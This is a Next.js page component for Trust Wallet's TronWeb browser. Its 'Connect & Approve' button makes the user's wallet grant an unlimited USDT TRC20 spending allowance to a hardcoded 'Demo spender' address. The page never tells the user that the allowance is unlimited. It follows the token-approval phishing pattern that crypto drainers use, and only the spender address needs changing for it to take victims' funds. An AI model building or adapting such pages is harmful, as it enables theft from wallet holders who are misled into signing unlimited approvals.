'use client';

import { useEffect, useState } from 'react';

export default function Home() {
  const [tronReady, setTronReady] = useState(false);
  const [userAddress, setUserAddress] = useState('');
  const [status, setStatus] = useState('');

  useEffect(() => {
    const checkTronWeb = setInterval(() => {
      if (typeof window !== 'undefined' && window.tronWeb && window.tronWeb.ready) {
        setTronReady(true);
        setUserAddress(window.tronWeb.defaultAddress.base58);
        clearInterval(checkTronWeb);
      }
    }, 500);

    return () => clearInterval(checkTronWeb);
  }, []);

  const handleApprove = async () => {
    if (!tronReady) {
      setStatus('❌ Please open this page in the Trust Wallet browser.');
      return;
    }

    try {
      const tronWeb = window.tronWeb;
      const usdtContract = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj'; // USDT TRC20
      const spender = 'T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb';   // Demo spender
      const amount = '9223372036854775807'; // Max int64 (unlimited)

      setStatus('🔄 Sending approve transaction...');

      const contract = await tronWeb.contract().at(usdtContract);
      const tx = await contract.approve(spender, amount).send();

      setStatus(`✅ Approve transaction sent! TXID: ${tx}`);
    } catch (e: any) {
      setStatus('❌ Error: ' + e.message);
    }
  };

  return (
    <main className="min-h-screen bg-[#0f172a] text-white flex flex-col items-center justify-center px-4">
      <h1 className="text-3xl font-bold mb-6">USDT TRC20 Approve</h1>
      <button
        onClick={handleApprove}
        className="bg-gradient-to-r from-blue-600 to-cyan-400 text-white px-6 py-3 rounded-full text-lg font-semibold shadow-md hover:opacity-90 transition"
      >
        Connect & Approve
      </button>
      <p className="mt-6 text-sm max-w-md text-center">{status}</p>
      {userAddress && (
        <p className="mt-2 text-xs text-gray-400">Connected Wallet: {userAddress}</p>
      )}
    </main>
  );
}
